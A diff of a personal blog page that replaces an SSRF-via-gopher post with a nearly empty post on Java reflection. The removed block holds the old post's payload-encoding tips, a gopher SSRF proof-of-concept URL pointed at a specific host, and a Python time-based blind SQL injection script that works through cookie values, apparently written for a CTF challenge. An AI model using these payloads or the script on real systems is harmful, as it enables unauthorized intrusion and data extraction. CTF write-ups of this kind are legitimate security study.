@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Made by jcxj">
+    <meta name="keywords" content="java反射机制, Made by jcxj">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Made by jcxj</title>
+    <title>java反射机制 | Made by jcxj</title>
     <link rel="icon" type="image/png" href="/jcxj/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/jcxj/libs/awesome/css/all.css">
@@ -203,12 +203,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/jcxj/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/jcxj/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">java反射机制</h1>
                 </div>
             </div>
         </div>
@@ -322,12 +322,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/jcxj/tags/java%E5%8F%8D%E5%B0%84/">
+                                <span class="chip bg-color">java反射</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/jcxj/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
+                                java反序列化
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -350,14 +363,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    578
+                    4
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    3 Min
+                    1 Min
                 </div>
                 
 
@@ -380,65 +393,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="ssrf利用gopher发包"><a href="#ssrf利用gopher发包" class="headerlink" title="ssrf利用gopher发包"></a>ssrf利用gopher发包</h1><h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>1.<strong>第一次编码后记得利用记事本将%0a换成%0d%0a，并且在编码末尾手动添加一个%0d%0a</strong></p>
-<p>2.<strong>gopher://默认发送到70端口，一般我们需要发送到80端口，记得改</strong></p>
-<p>3.post发包中Connection: close记得写，不写的话返回包速度太慢了</p>
-<p>4.记得在后的包之前补上gopher://127.0.0.1:80/_</p>
-<h3 id="在线编译网站"><a href="#在线编译网站" class="headerlink" title="在线编译网站"></a>在线编译网站</h3><p><a target="_blank" rel="noopener" href="http://www.hiencode.com/url.html">CTF在线工具-在线URL编码|URL解码 (hiencode.com)</a></p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php HTTP&#x2F;1.1
-Host: localhost:80
-Connection: close
-Content-Type: application&#x2F;x-www-form-urlencoded
-Cookie: this_is_your_cookie&#x3D;ZZZ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="get和post发包规范"><a href="#get和post发包规范" class="headerlink" title="get和post发包规范"></a>get和post发包规范</h3><p>post</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;test.php HTTP&#x2F;1.1
-Host: 127.0.0.1
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 11
-Connection: close            &#x2F;&#x2F;这个可以没有，但是没有的话连接结束会延迟一段时间
-
-uname&#x3D;admin&amp;passwd&#x3D;admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>get</p>
-<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;test.php?a&#x3D;Hello world HTTP&#x2F;1.1
-Host: 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h3 id="一次成功的发包"><a href="#一次成功的发包" class="headerlink" title="一次成功的发包"></a>一次成功的发包</h3><pre class="line-numbers language-none"><code class="language-none">final_poc&#x3D;
-&quot;http:&#x2F;&#x2F;61.147.171.105:57784&#x2F;use.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520&#x2F;index.php%2520HTTP&#x2F;1.1%250d%250aHost%253A%2520127.0.0.1%253A80%250d%250aContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250d%250aCookie%253A%2520this_is_your_cookie%253D&quot;+bs+&quot;%253B%250d%250aConnection%253A%2520close%250d%250a&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h3 id="某个cookie注入-时间盲注脚本"><a href="#某个cookie注入-时间盲注脚本" class="headerlink" title="某个cookie注入+时间盲注脚本"></a>某个cookie注入+时间盲注脚本</h3><pre class="line-numbers language-none"><code class="language-none">import urllib.parse
-import requests
-import time
-import base64
-url&#x3D;&quot;http:&#x2F;&#x2F;61.147.171.105:57784&#x2F;use.php?url&#x3D;&quot;
-flag&#x3D;&quot;&quot;
-for pos in range(1,100):
-	for i in range(33,127):
-		#poc&#x3D;&quot;&#39;) union select 1,2,if(1&#x3D;1,sleep(5),1) # &quot;
-		poc&#x3D;&quot;&#39;) union select 1,2,if(ascii( substr((select * from flag),&quot;+str(pos)+&quot;,1) )&#x3D;&quot;+str(i)+&quot;,sleep(2),1) # &quot;
-		bs &#x3D; str(base64.b64encode(poc.encode(&quot;utf-8&quot;)), &quot;utf-8&quot;)
-		#print(bs)
-		final_poc&#x3D;&quot;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520&#x2F;index.php%2520HTTP&#x2F;1.1%250d%250aHost%253A%2520127.0.0.1%253A80%250d%250aContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250d%250aCookie%253A%2520this_is_your_cookie%253D&quot;+bs+&quot;%253B%250d%250aConnection%253A%2520close%250d%250a&quot;
-		&quot;&quot;&quot;
-				   gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D&quot;+bs+&quot;%3B%250d%250a
-		
-		&quot;&quot;&quot;
-		#print(final_poc)
-		t1&#x3D;time.time()
-		res&#x3D;requests.get(url+final_poc)
-		t2&#x3D;time.time()
-		print(i)
-		if(t2-t1&gt;2):
-			print(t2-t1)
-			flag+&#x3D;chr(i)
-			print(flag)
-			if chr(i)&#x3D;&#x3D;&#39;&#125;&#39;:
-				break
-			break
-print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
+                <h1 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h1>
                 
             </div>
             <hr/>
@@ -464,7 +419,7 @@ print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://jcxj.github.io/jcxj/jcxj/2022/10/02/ssrf-fa-bao/">https://jcxj.github.io/jcxj/jcxj/2022/10/02/ssrf-fa-bao/</a>
+                    <a href="https://jcxj.github.io/jcxj/jcxj/2022/10/02/java-fan-she-ji-zhi/">https://jcxj.github.io/jcxj/jcxj/2022/10/02/java-fan-she-ji-zhi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -501,7 +456,11 @@ print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
+                            
+                                <a href="/jcxj/tags/java%E5%8F%8D%E5%B0%84/">
+                                    <span class="chip bg-color">java反射</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -691,18 +650,17 @@ print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;Current
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/jcxj/2022/10/02/ssrf-fa-bao/">
+                <a href="/jcxj/2022/10/02/ssrf-gopher-xie-yi/">
                     <div class="card-image">
                         
                         
-                        <img src="/jcxj/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/jcxj/medias/featureimages/11.jpg" class="responsive-img" alt="ssrf-gopher协议">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">ssrf-gopher协议</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -712,18 +670,29 @@ print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-02
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-02
+                        </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            jcxj
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/jcxj/categories/ssrf/" class="post-category">
+                                    ssrf
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/jcxj/tags/ssrf/">
+                        <span class="chip bg-color">ssrf</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -950,7 +919,7 @@ print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">15.3k</span>&nbsp;字
+                class="white-color">16.3k</span>&nbsp;字
             
             
             
